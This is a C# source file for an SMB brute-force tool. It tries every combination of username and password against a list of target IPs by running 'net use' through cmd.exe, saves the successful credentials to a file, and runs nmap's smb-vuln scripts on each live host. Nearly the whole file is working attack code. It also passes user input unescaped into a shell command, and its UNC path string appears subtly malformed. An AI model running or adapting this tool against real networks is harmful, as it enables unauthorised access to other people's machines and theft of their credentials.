using SMBLibrary.Client;
using SMBLibrary;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Reflection.Metadata;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using System.IO;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.StartPanel;
using Microsoft.VisualBasic.Logging;
using System.Runtime.Intrinsics.X86;
using DnsResolver.Services;
using SMBLibrary.RPC;
using Newtonsoft.Json.Linq;
using System.Windows.Forms;
using System.Xml;

namespace SMB.Models
{
    public static class SMBBruteForce
    {
        private static string hostnamesFilePath = "targets.txt";
        private static string failedFilePath = "failed.txt";
        private static string successFilePath = "success.txt";
        private static string versionsFilePath = "versionsList.txt";
        private static string vulnerabilityFilePath = "vulnerabilityList.txt";
        private static string[] usernames;
        private static string[] passwords;
        private static string[] ips;
        private static int connectionTimeout;
        private static int threadsCount;
        private static bool isReadyToStart = false;
        private static Queue<string> resultQueue = new Queue<string>();
        private static bool isBruteForceDone = false;
        private static ProcessStartInfo processInfo;
        private static Dictionary<string, string> infoDict = new Dictionary<string, string>();
        // number 2 for inactive ip,
        private static Dictionary<string, int> findPasswordDict = new Dictionary<string, int>();
        private static bool startProcess()
        {
            isBruteForceDone = false;
            resultQueue.Clear();
            Utils.FileUtils.writeLinesToFile([string.Empty], successFilePath);
            Utils.FileUtils.writeLinesToFile([string.Empty], failedFilePath);
            Utils.FileUtils.writeLinesToFile([string.Empty], versionsFilePath);
            Utils.FileUtils.writeLinesToFile([string.Empty], vulnerabilityFilePath);
            infoDict.Clear();
            findPasswordDict.Clear();
             
            try
            {



                    bool firstTry = true;
                    for (int j = 0; j < passwords.Length && isBruteForceDone == false ; j++)
                    {
                        for (int k = 0; k < usernames.Length && isBruteForceDone == false; k++)
                        {

                        for (int i = 0; i < ips.Length && isBruteForceDone == false; i++)
                        {
                            string output = "";
                            if (!firstTry)
                            {
                                if(findPasswordDict[ips[i]] != 2)
                                {
                                     output = AttemptLogin(ips[i], usernames[k], passwords[j]);

                                }
                                else
                                {
                                    continue;
                                }
                            }
                            else
                            {
                                 output = AttemptLogin(ips[i], usernames[k], passwords[j]);

                            }
                            if (firstTry && !output.Contains("System error 67 has occurred") && !findPasswordDict.ContainsKey(ips[i]))
                            {
                                CheckSMBVresion(ips[i]);
                                CheckSMBVulnerability(ips[i]);
                                findPasswordDict.Add(ips[i], 0);
                                
                            }
                            else if (output.Contains("System error 67 has occurred")&& firstTry && !findPasswordDict.ContainsKey(ips[i]))
                            {
                                findPasswordDict.Add(ips[i], 2);
                                string result = usernames[k] + ":" + passwords[j] + ":" +
                                       ips[i] + ":" + "" + ":" + "139/445" + ":" + "false" + ":" + "Inactive ip" + ":" + i;
                                resultQueue.Enqueue(result);
                                Utils.FileUtils.appendLinesToFile([result], failedFilePath);
                                continue;
                            }
                            if (findPasswordDict[ips[i]] == 0)
                            {
                                if (output == "")
                                {
                                    string result = usernames[k] + ":" + passwords[j] + ":" +
                                        ips[i] + ":" + "" + ":" + "139/445" + ":" + "true" + ":" + "" + ":" + i;
                                    findPasswordDict[ips[i]] = 1;
                                    resultQueue.Enqueue(result);
                                    Utils.FileUtils.appendLinesToFile([result], successFilePath);
                                }
                                else
                                {
                                    string result = usernames[k] + ":" + passwords[j] + ":" +
                                        ips[i] + ":" + "" + ":" + "139/445" + ":" + "false" + ":" + output + ":" + i;
                                    resultQueue.Enqueue(result);
                                    Utils.FileUtils.appendLinesToFile([result], failedFilePath);
                                }
                            }

                        }
                        firstTry = false;

                        }
                    }

                

                resultQueue.Enqueue("done");
                return true;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }


        private static string AttemptLogin(string ip, string user, string password)
        {
            string command = $"/C net use \\{ip} /user:{user} \"{password}\"";
            processInfo = new ProcessStartInfo("cmd.exe", command)
            {
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
            };


            using (var process = Process.Start(processInfo))
            {
               
                process.WaitForExit();

                if(process.ExitCode == 0)
                {
                    return "";
                }
                else
                {
                    var stderr = process.StandardError.ReadToEnd().ToString();
                    if (stderr == null || stderr == "")
                    {
                        stderr = process.StandardOutput.ReadToEnd();
                    }
                    return stderr.Replace(":","");
                }
            }


        }
        private static bool ValidateIP(string ip)
        {
            string[] parts = ip.Split('.');
            if (parts.Length != 4)
                return false;

            foreach (string part in parts)
            {
                if (!int.TryParse(part, out int num))
                    return false;
                if (num < 0 || num > 255)
                    return false;
            }

            return true;
        }

        private static void CheckSMBVresion(string ip)
        {
            string output = "";
            string error = "";

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "nmap",
                Arguments = $"-Pn -p139,445 --script smb-protocols {ip}",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = new Process { StartInfo = psi })
            {
                process.Start();
                output = process.StandardOutput.ReadToEnd();
                error = process.StandardError.ReadToEnd();
                process.WaitForExit();
                string versions = "\n" + ip + ": " + "\n" + output + error + "\n";
                infoDict.Add(ip + "version",versions);
                Utils.FileUtils.appendLinesToFile([versions], versionsFilePath);
            }
            
        }
        private static void CheckSMBVulnerability(string ip)
        {
            string output = "";
            string error = "";

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "nmap",
                Arguments = $"-Pn -p139,445 --script smb-vuln-* {ip}",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = new Process { StartInfo = psi })
            {
                process.Start();
                output = process.StandardOutput.ReadToEnd();
                error = process.StandardError.ReadToEnd();
                process.WaitForExit();
                string vulnerability = "\n" + ip + ": " + "\n" + output + error + "\n";
                infoDict.Add(ip + "vulnerability", vulnerability);
                infoDict.Add(ip + "hasVulnerability", output.Contains("CVE").ToString());
                Utils.FileUtils.appendLinesToFile([vulnerability], vulnerabilityFilePath);
            }

        }
        public static bool start()
        {
            if (isReadyToStart) { return startProcess(); }
            return false;
        }
        public static bool stop()
        {
            try
            {
             
                resultQueue.Clear();
                isBruteForceDone = true;
                return true;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }
        private static string[] mergeHostsAndPorts(string[] hosts, string[] ports)
        {
            List<string> result = new List<string>();
            for (int i = 0; i < hosts.Length; i++)
            {
                for (int j = 0; j < ports.Length; j++)
                {
                    result.Add(string.Format("{0}:{1}", hosts[i], ports[j]));
                }
            }
            return result.ToArray();
        }
        public static void parseArguments(string usersPath, string passwordsPath, string[] hosts)
        {
            

            usernames = fileAnalayze(usersPath);
            passwords = fileAnalayze(passwordsPath);
            ips = hosts;

            if (Utils.FileUtils.writeLinesToFile(hosts, hostnamesFilePath))
            {
                isReadyToStart = true;
            }
            else
            {
                MessageBox.Show("Something is wrong! Please try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

        }
        private static string[] fileAnalayze(string fileName)
        {
            string contentFile = String.Join(", ", Utils.FileUtils.
                readFile(fileName.ToString()));
            return contentFile.Split(", ");
        }
        public static bool allResultGetted()
        {
            return isBruteForceDone;
        }

        public static string? getInfo(string ip)
        {

            try
            {
                string result = "";
                result = infoDict[ip + "version"] + infoDict[ip + "vulnerability"];
                return result;

            }
            catch
            {

            }
            return "";
        }

        public static bool hasVulnerability(string ip)
        {

            try
            {
                if (infoDict[ip + "hasVulnerability"] == "True")
                {
                    return true;
                }

            }
            catch
            {

            }
            return false;
        }
        public static SMBResult? getResult()
        {

            if (isBruteForceDone)
            {
                try
                {
                    File.Delete(hostnamesFilePath);
                    File.Delete(failedFilePath);

                }
                catch
                {

                }
                return null;
            }
            try
            {
                string result = resultQueue.Dequeue();
                if (result == "done")
                {
                    isBruteForceDone = true;
                    return null;
                }

                if (result == null)
                {
                    return null;
                }

                string[] splitResult = result.Split(":");
                string user = splitResult[0];
                string pass = splitResult[1];
                string host = splitResult[2];
                string domain = splitResult[3];
                string port = splitResult[4];
                bool status = splitResult[5] == "true" ? true : false;
                int tableIndex = int.Parse(splitResult[7]);
                string errorStr = "";
                if (!status)
                {
                    errorStr = splitResult[6];
                }

                SMBResult smbResult = new SMBResult(user, pass, host, port, status, errorStr, tableIndex);

                return smbResult;
            }
            catch(Exception e)
            {
                Console.WriteLine(e.ToString());
                return null;
            }
        }
    }
}
